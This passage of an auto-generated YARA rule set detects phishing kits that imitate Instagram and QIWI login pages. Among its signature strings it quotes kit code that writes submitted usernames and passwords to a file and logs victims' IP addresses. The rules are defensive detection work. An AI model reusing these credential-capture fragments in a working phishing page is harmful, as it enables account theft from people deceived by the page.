      $s5 = "<!-- saved from url=(0139)https://staticxx.facebook.com/connect/xd_arbiter/r/lY4eZXm_YWu.js?version=42#channel=f39a7d8ae18673c&o" ascii /* score: '30.00'*/
      $s6 = "se j.error(\"Failed proxying to %s, expected %s\",G,y)};var C=null,D={xd_action:\"proxy_ready\",logged_in:/\\bc_user=/.test(docu" ascii /* score: '29.50'*/
      $s7 = "__d(\"Flash\",[\"DOMEventListener\",\"DOMWrapper\",\"QueryString\",\"UserAgent_DEPRECATED\",\"guid\",\"htmlSpecialChars\"],(func" ascii /* score: '29.00'*/
      $s8 = "rigin=https%3A%2F%2Fwww.instagram.com -->" fullword ascii /* score: '26.00'*/
      $s9 = "(function(a,b){var c=a.window||a;function d(){return\"f\"+(Math.random()*(1<<30)).toString(16).replace(\".\",\"\")}function e(j)" ascii /* score: '26.00'*/
      $s10 = "tle></head><body><script>document.domain = 'facebook.com';__transform_includes = {};self.__DEV__=self.__DEV__||0;" fullword ascii /* score: '25.00'*/
      $s11 = "ra(?:.+Version.|.)(\\d+\\.\\d+))|(?:AppleWebKit.(\\d+(?:\\.\\d+)?))|(?:Trident\\/\\d+\\.\\d+.*rv:(\\d+\\.\\d+))/.exec(z),B=/(Mac" ascii /* score: '24.00'*/
      $s12 = "Native.postMessage(t,A)};window.addEventListener(\"fbNativeReady\",B)}}var t=/#(.*)|$/.exec(location.href)[1];if(window==top)loc" ascii /* score: '23.00'*/
      $s13 = "p();if(h)return;h=true;var z=navigator.userAgent,A=/(?:MSIE.(\\d+\\.\\d+))|(?:(?:Firefox|GranParadiso|Iceweasel).(\\d+\\.\\d+))|" ascii /* score: '22.00'*/
      $s14 = " proxy\");s()}else{j.info(\"Legacy proxy to %s\",u.relation);r()}return}if(v!=/https?/.exec(window.name)[0]){j.info(\"Redirectio" ascii /* score: '22.00'*/
      $s15 = "https:\\/\\/connect.facebook.net\\/rsrc.php\\/v2\\/yW\\/r\\/yOZN1vHw3Z_.swf\"}}); require('initXdArbiter'); </script><b id=\"war" ascii /* score: '22.00'*/
      $s16 = "loat(A[3]):NaN;l=A[4]?parseFloat(A[4]):NaN;if(l){A=/(?:Chrome\\/(\\d+\\.\\d+))/.exec(z);m=A&&A[1]?parseFloat(A[1]):NaN}else m=Na" ascii /* score: '21.00'*/
      $s17 = "ion.hash=\"\";if(!t){j.error(\"xd_arbiter.php loaded without a valid hash, referrer: %s\",document.referrer);return}var u=h.deco" ascii /* score: '21.00'*/
      $s18 = "ble(e),configurable:true,get:d.__lookupGetter__(e),set:d.__lookupSetter__(e)}}}}(Object.getOwnPropertyDescriptor)}})();" fullword ascii /* score: '21.00'*/
      $s19 = "<!-- saved from url=(0139)https://staticxx.facebook.com/connect/xd_arbiter/r/lY4eZXm_YWu.js?version=42#channel=f39a7d8ae18673c&o" ascii /* score: '21.00'*/
      $s20 = "__d(\"Log\",[\"sprintf\"],(function a(b,c,d,e,f,g,h){var i={DEBUG:3,INFO:2,WARNING:1,ERROR:0};function j(l,m){var n=Array.protot" ascii /* score: '20.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__instagram_home_ubuntu_malware_lab_samples_extracted_phishing_Instagram_login {
   meta:
      description = "phish__instagram - file login.html"
      author = "Comps Team Malware Lab"
      reference = "phish__instagram phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "569a26536c55d7fde9171f875ba8fe76e9d80c331fd33b9c934df230004c66e3"
   strings:
      $x1 = "<style type=\"text/css\" data-isostyle-id=\"is6d0655d8\">._2g7d5{font-weight:600;overflow:hidden;text-overflow:ellipsis;white-sp" ascii /* score: '61.00'*/
      $x2 = "    <span id=\"react-root\"><section class=\"_sq4bv _29u45\"><main class=\"_8fi2q _2v79o\" role=\"main\"><article class=\"_qmq8y" ascii /* score: '40.00'*/
      $x3 = "<div class=\"_c2vev\"><div class=\"_162ov\"></div></div><div id=\"fb-root\" class=\" fb_reset\"><div style=\"position: absolute;" ascii /* score: '40.00'*/
      $x4 = ".fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_reset .fb_dialog_legacy{overflow:vis" ascii /* score: '40.00'*/
      $x5 = "<script type=\"text/javascript\">!function(e){function n(o){if(a[o])return a[o].exports;var r=a[o]={i:o,l:!1,exports:{}};return " ascii /* score: '31.00'*/
      $s6 = "<!-- saved from url=(0026)https://www.instagram.com/ -->" fullword ascii /* score: '30.00'*/
      $s7 = "<meta content=\"Create an account or log in to Instagram - A simple, fun &amp; creative way to capture, edit &amp; share photos," ascii /* score: '27.00'*/
      $s8 = "            <script type=\"text/javascript\">window._sharedData = {\"activity_counts\": null, \"config\": {\"csrf_token\": \"Kn0" ascii /* score: '27.00'*/
      $s9 = ".fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-alig" ascii /* score: '27.00'*/
      $s10 = "{min-height:32px;z-index:2;zoom:1}.fb_iframe_widget_loader .FB_Loader{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/" ascii /* score: '27.00'*/
      $s11 = "aver.js\"></script><script type=\"text/javascript\" src=\"chrome-extension://jnkdcmgmnegofdddphijckfagibepdlb/inject_download_al" ascii /* score: '26.00'*/
      $s12 = "<html lang=\"en\" class=\"js not-logged-in client-root\"><!--<![endif]--><head><meta http-equiv=\"Content-Type\" content=\"text/" ascii /* score: '26.00'*/
      $s13 = "<html lang=\"en\" class=\"js not-logged-in client-root\"><!--<![endif]--><head><meta http-equiv=\"Content-Type\" content=\"text/" ascii /* score: '26.00'*/
      $s14 = "Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_loader{background-color:#f6f7f9;border:1px solid #606060;font-size:24px;" ascii /* score: '25.00'*/
      $s15 = "<meta content=\"Create an account or log in to Instagram - A simple, fun &amp; creative way to capture, edit &amp; share photos," ascii /* score: '24.00'*/
      $s16 = " 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16p" ascii /* score: '23.00'*/
      $s17 = "<meta property=\"og:url\" content=\"https://instagram.com/\">" fullword ascii /* score: '22.00'*/
      $s18 = "_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_content .dialog_header{-web" ascii /* score: '22.00'*/
      $s19 = "YeTNIlTZjm.png) no-repeat 0 -20px;bottom:-10px;left:-10px}.fb_dialog_bottom_right{background:url(https://static.xx.fbcdn.net/rsr" ascii /* score: '22.00'*/
      $s20 = "ialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_button{text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}" ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule _opt_mal_phish__instagram_home_ubuntu_malware_lab_samples_extracted_phishing_Instagram_index {
   meta:
      description = "phish__instagram - file index.php"
      author = "Comps Team Malware Lab"
      reference = "phish__instagram phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "5d075785e9770ec2637793b66977cc5c4fd0b7545711033e6dde3c484eff15c4"
   strings:
      $s1 = "header('Location: login.html');" fullword ascii /* score: '16.00'*/
      $s2 = "include 'ip.php';" fullword ascii /* score: '7.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__instagram_home_ubuntu_malware_lab_samples_extracted_phishing_Instagram_login_2 {
   meta:
      description = "phish__instagram - file login.php"
      author = "Comps Team Malware Lab"
      reference = "phish__instagram phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "926ab74674d52bef2c8e7cbcc5d0877690e50b960fe079fed33334e5873da9e6"
   strings:
      $s1 = "file_put_contents(\"usernames.txt\", \"Account: \" . $_POST['username'] . \" Pass: \" . $_POST['password'] . \"\\n\", FILE_APPEN" ascii /* score: '29.00'*/
      $s2 = "header('Location: https://instagram.com');" fullword ascii /* score: '18.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _opt_mal_phish__instagram_home_ubuntu_malware_lab_samples_extracted_phishing_Instagram_ip {
   meta:
      description = "phish__instagram - file ip.php"
      author = "Comps Team Malware Lab"
      reference = "phish__instagram phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d0f8f3e7985a87e0beb1699ccfadab7268ffc777c05fa1dfcc35a16b6d393947"
   strings:
      $s1 = "$useragent = \" User-Agent: \";" fullword ascii /* score: '17.00'*/
      $s2 = "$browser = $_SERVER['HTTP_USER_AGENT'];" fullword ascii /* score: '15.00'*/
      $s3 = "fwrite($fp, $useragent);" fullword ascii /* score: '12.00'*/
      $s4 = "elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))" fullword ascii /* score: '12.00'*/
      $s5 = "$file = 'ip.txt';" fullword ascii /* score: '11.00'*/
      $s6 = "      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'].\"\\r\\n\";" fullword ascii /* score: '10.00'*/
      $s7 = "fwrite($fp, $victim);" fullword ascii /* score: '9.00'*/
      $s8 = "$victim = \"IP: \";" fullword ascii /* score: '9.00'*/
      $s9 = "fwrite($fp, $ipaddress);" fullword ascii /* score: '7.00'*/
      $s10 = "if (!empty($_SERVER['HTTP_CLIENT_IP']))" fullword ascii /* score: '7.00'*/
      $s11 = "      $ipaddress = $_SERVER['HTTP_CLIENT_IP'].\"\\r\\n\";" fullword ascii /* score: '5.00'*/
      $s12 = "$fp = fopen($file, 'a');" fullword ascii /* score: '4.00'*/
      $s13 = "fwrite($fp, $browser);" fullword ascii /* score: '4.00'*/
      $s14 = "      $ipaddress = $_SERVER['REMOTE_ADDR'].\"\\r\\n\";" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}



/* ===================== */
/* Source: /home/ubuntu/yara-lab/rule_library/generated/phish__wordpress/phish__wordpress_auto.yar */
/* ===================== */

/*
   YARA Rule Set
   Author: Comps Team Malware Lab
   Date: 2026-02-27
   Identifier: phish__wordpress
   Reference: phish__wordpress phishing_kit auto gen
*/

/* Rule Set ----------------------------------------------------------------- */

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_QIWI_QIWI_index_files_qiwi {
   meta:
      description = "phish__wordpress - file qiwi.js"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "e5ce54cb2fba7742f802acb1416b37dfa2acec6a9aa7e80db660b89d90d735ff"
   strings:
      $x1 = "function li(a,b){return a.va&&b?$a(a.va,b):-1}d.removeChild=function(a,b){if(a){var c=ia(a)?a:a.Ha();a=ei(this,c);if(c&&a){var e" ascii /* score: '47.00'*/
      $x2 = "this),clear:!1})};d.mQ=function(){return this.F({link:jk})};E(D.a(),NA);nk=new G(u.qiwi.remind.form);ok=new G(u.qiwi.remind.mail" ascii /* score: '42.00'*/
      $x3 = "function ec(a){return s&&fc>=a}var gc=aa.document,fc=gc&&s?ac()||(\"CSS1Compat\"==gc.compatMode?parseInt(bc,10):5):void 0;functi" ascii /* score: '41.00'*/
      $x4 = "d.UQ=function(){clearTimeout(this.hn);this.hn=setTimeout(z(function(){this.h(this.Dn)},this),this.kH);return y()};d.Jm=function(" ascii /* score: '41.00'*/
      $x5 = "HA.prototype.Wc=function(){var a=v.Deferred();this.zo.request(!0);this.zo.bindspace(this,\"load error\",function(){this.zo.reque" ascii /* score: '40.00'*/
      $x6 = "function Ze(a,b,c,e,f,g,l,r){a.send(zd(!0,{event:Ya(Xa(b)),eventCategory:Ya(Xa(c)),eventAction:Ya(Xa(e)),eventLabel:f||\"\",even" ascii /* score: '39.00'*/
      $x7 = "this.e.analytics)this.L.filter(\":text,:password\").each(function(){var a=v(this),c=a.val();a.data(\"ui-mask\")&&(c=a.mask(\"val" ascii /* score: '38.00'*/
      $x8 = "d.Ey=function(a){this.cz+=1;this.bs.remove();return this.F({link:this.lN,data:a.data,request:this.k,k:this.KC,sa:\"append\",t:th" ascii /* score: '37.00'*/
      $x9 = "var bh=new Lg(\"oauth-created\"),ch=new Lg(\"oauth-login-success\"),dh=new Lg(\"oauth-login-error\"),eh=new Lg(\"oauth-login-err" ascii /* score: '36.00'*/
      $x10 = "ch.addListener(function(a){return Uj.a().eJ.h(a)},1);dh.addListener(function(a){return Uj.a().bJ.h(a)});dh.addListener(function(" ascii /* score: '36.00'*/
      $x11 = "function fd(a,b){if(\"textContent\"in a)a.textContent=b;else if(3==a.nodeType)a.data=b;else if(a.firstChild&&3==a.firstChild.nod" ascii /* score: '36.00'*/
      $x12 = "d.h=function(a,b,c){Qd(a)&&(a=a.getName());Jd(a)||Ud(\"Action must be action or action name\");this.kr[a]||Ud(\"Widget %s has no" ascii /* score: '34.00'*/
      $x13 = "tion %s\",this.getName(),a);a=this.kr[a];this.log(za(\"execute action %s\",a.getName()));b=$.extend(b||{},{action:a});return a.h" ascii /* score: '34.00'*/
      $x14 = "function $m(a){a.k.remove();return an.rc()?an.a().V.h():y()}d.BO=function(a){this.ca(a);return this.Jp({message:u.person.wallet." ascii /* score: '34.00'*/
      $x15 = "u.shell.validate);return this}m(Ge,A);h(Ge);Ge.prototype.getName=q(\"validate\");Ge.prototype.getData=q(\"validate\");Ge.prototy" ascii /* score: '34.00'*/
      $x16 = "b){$.ajax({url:\"https://maps-api-ssl.google.com/maps/suggest\",data:{q:a.term,cp:10,json:!0},dataType:\"jsonp\",success:functio" ascii /* score: '33.00'*/
      $x17 = "d.Zp=function(a){this.L.disabled(!0).refresh();this.od.hide();this.R.empty().show();return this.trigger(this.ri,{k:this.R,sa:\"h" ascii /* score: '33.00'*/
      $x18 = "d.Lm=function(){};d.Wp=function(a){return this.trigger(this.Ko,a)};d.Yp=function(a){this.ca(a);this.e.context=a.context;return t" ascii /* score: '32.00'*/
      $x19 = "d.each=function(a){var b=v(a),c=b.attr(this.getData()),e=v(\"\\x3cinput\\x3e\");e.attr({type:\"text\",tabindex:b.attr(\"tabindex" ascii /* score: '32.00'*/
      $x20 = "V,{target:!0})};d.kQ=function(a){this.mb.val(a.data.login).trigger(\"change\");this.Oe.val(a.data.newPassword).trigger(\"change" ascii /* score: '32.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 2000KB and
      1 of ($x*)
}

rule qiwi_main_lib {
   meta:
      description = "phish__wordpress - file qiwi-main-lib.js"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "34292303c025222b51be2e1755d3e3dd2828924a8ab50d5e028aed9f1396d892"
   strings:
      $x1 = "]+$/i},b=/^[-+]?[0-9]+$/,x=/^(?:[-+]?(?:0|[1-9][0-9]*))$/,w=/^(?:[-+]?(?:[0-9]+))?(?:\\.[0-9]*)?(?:[eE][\\+\\-]?(?:[0-9]+))?$/,k" ascii /* score: '79.00'*/
      $x2 = "function r(t,e){if(!i.canUseDOM||e&&!(\"addEventListener\"in document))return!1;var n=\"on\"+t,r=n in document;if(!r){var a=docu" ascii /* score: '70.00'*/
      $x3 = "\";default:return t}},week:{dow:1,doy:7}});return o})},[823,653,654,275,657,658],function(t,e){(function(e){\"undefined\"!=typeo" ascii /* score: '68.50'*/
      $x4 = "e[\"default\"]=n,t.exports=e[\"default\"]},function(t,e,n){\"use strict\";function r(t){return(t.ctrlKey||t.metaKey)&&t.keyCode=" ascii /* score: '68.00'*/
      $x5 = "\"use strict\";function n(t){function e(t){}if(!t)throw new TypeError(\"argument namespace is required\");return e._file=void 0," ascii /* score: '67.50'*/
      $x6 = "\"}]});e.IdentificationDocsSchemaAny=s},[819,645],function(t,e,n){\"use strict\";var r=n(1)[\"default\"];e.__esModule=!0;var o=n" ascii /* score: '67.00'*/
      $x7 = "\")):null)},o(e,null,[{key:\"propTypes\",value:l.propTypes({icon:c.Bool,children:l.ReactNode}),enumerable:!0}]),e}(s.Component);" ascii /* score: '67.00'*/
      $x8 = "var r=n(14);r.Any=n(204),r.Array=n(771),r.Boolean=n(322),r.Date=n(772),r.Error=n(773),r.Function=n(205),r.Nil=n(323),r.Number=n(" ascii /* score: '65.00'*/
      $x9 = "var o=a.getNode(this._rootNodeID);r.updateTextContent(o,n)}}},unmountComponent:function(){i.unmountIDFromEnvironment(this._rootN" ascii /* score: '62.00'*/
      $x10 = "o[t]=r},detachRef:function(t){var e=this.getPublicInstance().refs;delete e[t]},getName:function(){var t=this._currentElement.typ" ascii /* score: '60.00'*/
      $x11 = "\"}},function(t,e){t.exports={config:{debug:{enabled:!1,mask:\"qiwi:*\"},sitePrefix:\"\",locale:{lang:\"ru\",translations:{}},xd" ascii /* score: '58.50'*/
      $x12 = "\"],u=[\"{\",\"}\",\"|\",\"\\\\\",\"^\",\"`\"].concat(s),c=[\"'\"].concat(u),l=[\"%\",\"/\",\"?\",\";\",\"#\"].concat(c),f=[\"/" ascii /* score: '55.50'*/
      $x13 = "return 1>a?(o=t.year()-1,r=a+_t(o,e,n)):a>_t(t.year(),e,n)?(r=a-_t(t.year(),e,n),o=t.year()+1):(o=t.year(),r=a),{week:r,year:o}}" ascii /* score: '54.00'*/
      $x14 = "\":\"ss\"};t.exports=n},function(t,e,n){function r(t,e,n,r,i,a,s){var u=-1,c=t.length,l=e.length;if(c!=l&&!(i&&l>c))return!1;for" ascii /* score: '53.00'*/
      $x15 = "!function(){\"use strict\";function n(){for(var t=[],e=0;e<arguments.length;e++){var r=arguments[e];if(r){var o=typeof r;if(\"st" ascii /* score: '52.00'*/
      $x16 = "}function c(t){v(t,i)}function l(t){v(t,a)}function f(t,e,n,r){h.injection.getInstanceHandle().traverseEnterLeave(n,r,s,t,e)}fun" ascii /* score: '50.00'*/
      $x17 = "onMouseUpCapture:!0})}},paste:{phasedRegistrationNames:{bubbled:_({onPaste:!0}),captured:_({onPasteCapture:!0})}},pause:{phasedR" ascii /* score: '48.00'*/
      $x18 = "javascript:!0,\"javascript:\":!0},E={javascript:!0,\"javascript:\":!0},C={http:!0,https:!0,ftp:!0,gopher:!0,file:!0,\"http:\":!0" ascii /* score: '48.00'*/
      $x19 = "n=N(n)),e=n),e}function c(){var e,n,r,i,a,s;if(e=vt,61===t.charCodeAt(vt)?(n=F,vt++):(n=x,0===wt&&o(R)),n!==x){if(r=[],j.test(t." ascii /* score: '47.00'*/
      $x20 = "\".split(\"|\");y.prototype.add=function(t,e){return this.__schemas__[t]=e,h(this),this},y.prototype.set=function(t){return this" ascii /* score: '47.00'*/
   condition:
      uint16(0) == 0x6874 and filesize < 2000KB and
      1 of ($x*)
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_QIWI_QIWI_index_files_main {
   meta:
      description = "phish__wordpress - file main.css"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d3bf9755512b83d8a2a8f56c1ba6ee2a5cc6c0e7359f0d22b5af6b603c8a2ba3"
   strings:
      $x1 = ".container{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}.container:before,.container:after{content:\"" ascii /* score: '70.00'*/
      $x2 = "er:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/images/providers/logoBig/i_count" ascii /* score: '33.00'*/
      $x3 = "ne;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/images/providers/logoBig/" ascii /* score: '33.00'*/
      $x4 = "ogid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/images/providers/logoBig/910_l.png',s" ascii /* score: '33.00'*/
      $x5 = "id:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/images/providers/logoBig/901_l.png',siz" ascii /* score: '33.00'*/
      $x6 = " .frame .icon.icon_901{background:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/qiwi" ascii /* score: '31.00'*/
      $x7 = "ist li .frame .icon.icon_907{background:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/im" ascii /* score: '31.00'*/
      $x8 = "wi.com/img/themes/beeline/identification/identification-profile.png)}.theme__beeline .header-content .auth_login .identify_statu" ascii /* score: '31.00'*/
      $s9 = "70px;z-index:10;content:\" \";width:220px;background:url(//static.qiwi.com/img/themes/beeline/logo/logo2x.png) no-repeat;backgro" ascii /* score: '30.00'*/
      $s10 = "actions .logout a{color:#000}.theme__megafon .header-content .auth_actions .logout a:hover{color:#00985f}.theme__megafon .top-up" ascii /* score: '29.00'*/
      $s11 = ".Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/qiwi_com/ui/transfer/themes/megafon/images/providers/logoBig/906_l.png',s" ascii /* score: '28.00'*/
      $s12 = "-pic{background:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/images/" ascii /* score: '28.00'*/
      $s13 = "g-box.bank{background:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/i" ascii /* score: '28.00'*/
      $s14 = "id-img .img-box.bank{background:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/qiwi_c" ascii /* score: '28.00'*/
      $s15 = "n.icon_908{background:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/i" ascii /* score: '28.00'*/
      $s16 = "r:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/qiwi_com/ui/transfer/icons/i_eggs_200.png',sizin" ascii /* score: '28.00'*/
      $s17 = "ground:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/qiwi_com/ui/transfer/icons/i_ba" ascii /* score: '28.00'*/
      $s18 = "r:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/qiwi_com/ui/transfer/icons/i_mail_200.png',sizin" ascii /* score: '28.00'*/
      $s19 = "und:none;filter:progid:DXImageTransform.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/images/providers/lo" ascii /* score: '28.00'*/
      $s20 = "orm.Microsoft.AlphaImageLoader(src='//static.qiwi.com/img/themes/megafon/images/providers/logoBig/917_l.png',sizingMethod='scale" ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x632e and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule qiwi_main_lib_2 {
   meta:
      description = "phish__wordpress - file qiwi-main-lib.css"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "d813aed99d1c97bae282abc6bbcd031747ac4f6e44c10458cd9e7c7d4d38518c"
   strings:
      $x1 = ".qw-back-button{color:#000;font-size:13px;font-weight:400;padding:7px 14px;background:#fff;border:0;min-height:40px;white-space:" ascii /* score: '56.00'*/
      $s2 = "inear}.theme__megafon .qw-identification-process-load-spinner-loader{stroke:#00965d}.theme__beeline .qw-identification-process-l" ascii /* score: '23.00'*/
      $s3 = "-identification-process-load-spinner-loader{fill:none;stroke:#ffa834;stroke-width:.1em;stroke-linecap:round;stroke-dasharray:2.3" ascii /* score: '23.00'*/
      $s4 = "oad-spinner-loader{stroke:#ffb612}.qw-identification-process-load-spinner-border{fill:none;stroke:#d3d3d3;stroke-width:.1em}.qw-" ascii /* score: '23.00'*/
      $s5 = "10px -.5%}.qw-three-column:after,.qw-three-column:before{content:\"\";display:table}.qw-three-column:after{clear:both;content:\"" ascii /* score: '19.00'*/
      $s6 = "olid #f2f2f2}.qw-identification-form-main-header-security:after,.qw-identification-form-main-header-security:before{content:\"\"" ascii /* score: '19.00'*/
      $s7 = "m-main-docs-head:before{content:\"\";display:table}.qw-identification-form-main-docs-head:after{clear:both}.qw-identification-fo" ascii /* score: '19.00'*/
      $s8 = "px -1%}.qw-help-teaser-list:after,.qw-help-teaser-list:before{content:\"\";display:table}.qw-help-teaser-list:after{clear:both}." ascii /* score: '19.00'*/
      $s9 = "66666666666667" ascii /* score: '17.00'*/ /* hex encoded string 'ffffffg' */
      $s10 = "46666666666667" ascii /* score: '17.00'*/ /* hex encoded string 'Ffffffg' */
      $s11 = "46666666666665" ascii /* score: '17.00'*/ /* hex encoded string 'Ffffffe' */
      $s12 = ":rotate(1turn)}}@-webkit-keyframes spinner-loader-animation{0%,10%{stroke-dasharray:2.3525em .4705em;stroke-dashoffset:0}50%{str" ascii /* score: '16.00'*/
      $s13 = "}@keyframes spinner-loader-animation{0%,10%{stroke-dasharray:2.3525em .4705em;stroke-dashoffset:0}50%{stroke-dashoffset:-2.826em" ascii /* score: '16.00'*/
      $s14 = "1.33333333333333%;margin:10px 1%}.qw-content.big{margin:20px 0 0}.qw-three-column{zoom:1;margin:-5px -1%}.qw-three-column-title{" ascii /* score: '16.00'*/
      $s15 = ";width:31.33333333333333%;margin:5px 1%}.qw-content{zoom:1;margin:-10px 0}.qw-content:after,.qw-content:before{content:\"\";disp" ascii /* score: '15.00'*/
      $s16 = "t;padding:20px;margin:0;opacity:0;-ms-filter:\"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)\";filter:alpha(opacity=0);box-" ascii /* score: '15.00'*/
      $s17 = "ontainer{min-width:1005px;min-height:100%;position:relative;margin-bottom:-280px}.qw-container:after{content:\"\";display:block;" ascii /* score: '15.00'*/
      $s18 = "troke:#000}.theme__beeline svg .colorbrand{stroke:#f0be32}.noscript{box-shadow:0 1px 2px 0 rgba(0,0,0,.16)}.noscript-logo{displa" ascii /* score: '15.00'*/
      $s19 = "on-form-main-notes:before{content:\"\";display:table}.qw-identification-form-main-notes:after{clear:both}.qw-identification-form" ascii /* score: '14.00'*/
      $s20 = "ff}.qw-identification-process:first-child{margin-top:0}.qw-identification-process:last-child{margin-bottom:0}.qw-identification-" ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x712e and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule settings {
   meta:
      description = "phish__wordpress - file settings.js"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "2e4f2fde23c0e4373d00eb6903031e55066ad7e863adea542d58e8a98f598c76"
   strings:
      $s1 = "error: \"https:\\/\\/static.qiwi.com\\/img\\/visa_qiwi_com\\/ui\\/statuses\\/error.png\"" fullword ascii /* score: '23.00'*/
      $s2 = "success: \"https:\\/\\/static.qiwi.com\\/img\\/visa_qiwi_com\\/ui\\/statuses\\/success.png\"," fullword ascii /* score: '23.00'*/
      $s3 = "link : \"/acquiring/content/pay/subscribed/process.action\"" fullword ascii /* score: '20.00'*/
      $s4 = "link : \"/order/external/content/form/login.action\"," fullword ascii /* score: '20.00'*/
      $s5 = "link : \"/acquiring/content/pay/unsubscribed/process.action\"" fullword ascii /* score: '20.00'*/
      $s6 = "link : \"/acquiring/content/subscribe/process.action\"," fullword ascii /* score: '20.00'*/
      $s7 = "        server : \"https:\\/\\/sso.qiwi.com\"," fullword ascii /* score: '18.00'*/
      $s8 = "link : \"/person/change/success/content/password.action\"," fullword ascii /* score: '17.00'*/
      $s9 = "link : \"https://static.qiwi.com/img/visa_qiwi_com/ui/replenish/map/icon/shadow.png\"" fullword ascii /* score: '17.00'*/
      $s10 = "link : \"/register/content/password.action\"," fullword ascii /* score: '17.00'*/
      $s11 = "link : \"https://static.qiwi.com/img/visa_qiwi_com/ui/replenish/map/icon/terminal.png\"" fullword ascii /* score: '17.00'*/
      $s12 = "link : \"https://static.qiwi.com/img/qiwi_com/ui/replenish/map/icon/money2.png\"" fullword ascii /* score: '17.00'*/
      $s13 = "\\u003C\\/p\\u003E\\n\\u003Cp\\u003E\\u003Ca href=\\\"\\/support\\/faq\\/binding-of-bank-card.action\\\" target=\\\"_blank\\\"" ascii /* score: '17.00'*/
      $s14 = "link : \"https://static.qiwi.com/img/visa_qiwi_com/ui/replenish/map/icon/money.png\"" fullword ascii /* score: '17.00'*/
      $s15 = "link : \"/external/register/content/password.action\"," fullword ascii /* score: '17.00'*/
      $s16 = "link : \"https://static.qiwi.com/img/qiwi_com/ui/replenish/map/icon/terminal2.png\"" fullword ascii /* score: '17.00'*/
      $s17 = "link : \"https://static.qiwi.com/img/visa_qiwi_com/ui/replenish/map/icon/office.png\"" fullword ascii /* score: '17.00'*/
      $s18 = "link : \"https://static.qiwi.com/img/visa_qiwi_com/ui/replenish/map/icon/shop.png\"" fullword ascii /* score: '17.00'*/
      $s19 = "link : \"/remind/password/content.action\"," fullword ascii /* score: '17.00'*/
      $s20 = "link : \"https://static.qiwi.com/img/visa_qiwi_com/ui/replenish/map/icon/none.png\"" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x0a0a and filesize < 200KB and
      8 of them
}

rule _opt_mal_phish__wordpress_home_ubuntu_malware_lab_samples_extracted_phishing_Wordpress_QIWI_QIWI_index {
   meta:
      description = "phish__wordpress - file index.html"
      author = "Comps Team Malware Lab"
      reference = "phish__wordpress phishing_kit auto gen"
      date = "2026-02-27"
      hash1 = "0d35edd6f435d7d8c57271f7164cbfb6fb694c48b59e8661aee6d0d9644d94c4"
   strings:
      $s1 = "<div id=\"cboxOverlay\" style=\"display: none;\"></div><div id=\"colorbox\" class=\"\" role=\"dialog\" tabindex=\"-1\" style=\"d" ascii /* score: '30.00'*/
